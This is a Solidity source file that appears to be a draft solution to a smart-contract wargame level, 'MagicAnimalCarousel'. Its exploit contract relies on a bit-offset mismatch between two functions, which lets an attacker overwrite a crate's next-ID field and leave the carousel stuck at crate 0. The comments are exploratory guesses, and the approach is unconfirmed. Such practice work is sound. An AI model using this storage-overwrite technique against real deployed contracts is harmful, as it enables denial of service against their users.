// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "../levels/MagicAnimalCarousel.sol";

contract CarouselExploit4 {
    MagicAnimalCarousel public target;
    
    constructor(address _target) {
        target = MagicAnimalCarousel(_target);
    }
    
    function exploit() external {
        // The winning condition might be to have ALL crates cleared
        // Or to have a crate with no owner and no next ID
        
        // Let's clear the owner of crate 0
        target.changeAnimal("", 0);
        
        // Check carousel[0]
        uint256 crate0 = target.carousel(0);
        
        // Now let's try to set everything to 0
        // When we use changeAnimal with empty string and no owner, it clears owner but keeps animal and next
        // But what if we use changeAnimal to overwrite the next ID with 0?
        
        // Actually, let's think about what breaks the carousel:
        // If currentCrateId points to a crate with next ID = 0, and crate 0 has next ID = 0
        // Then the carousel is stuck!
        
        // Let's create this condition
        // First, go back to crate 0 if needed
        while (target.currentCrateId() != 0) {
            target.setAnimalAndSpin("move");
        }
        
        // Now change crate 0 to have next ID = 0
        bytes memory zeroNext = hex"00000000000000000000000000";
        target.changeAnimal(string(zeroNext), 0);
        
        // Now the carousel is stuck at crate 0!
    }
    
    function clearAllData() external {
        // Maybe we need to clear all data from the current crate
        uint256 current = target.currentCrateId();
        
        // First clear the owner
        target.changeAnimal("", current);
        
        // Then set animal that makes next ID = 0
        target.changeAnimal(string(hex"00000000000000000000000000"), current);
        
        // Now this crate has no owner, next ID = 0, and animal = 0
    }
    
    function exploitPrecise() external {
        // After more analysis, I think the key insight is:
        // In setAnimalAndSpin, animal is at bits 176-255
        // In changeAnimal, animal is at bits 160-239
        // This means in changeAnimal, the first 16 bits of the animal overwrite the next crate ID!
        
        // So if we set an animal with specific first 2 bytes, we control the next crate ID
        
        // Let's implement the attack:
        // 1. Make sure we're at a known position
        uint256 pos = target.currentCrateId();
        
        // 2. If we're not at 0, let's get there
        if (pos != 0) {
            // Set next of current position to 0
            target.changeAnimal(string(hex"00000000000000000000000000"), pos);
            // Then spin to get to 0
            target.setAnimalAndSpin("go");
        }
        
        // 3. Now we're at crate 0, let's break it
        // Set crate 0's next ID to 0 (pointing to itself)
        target.changeAnimal(string(hex"00000000000000000000000000"), 0);
        
        // The carousel is now permanently stuck at crate 0!
        // No matter how many times we spin, we stay at 0
    }
}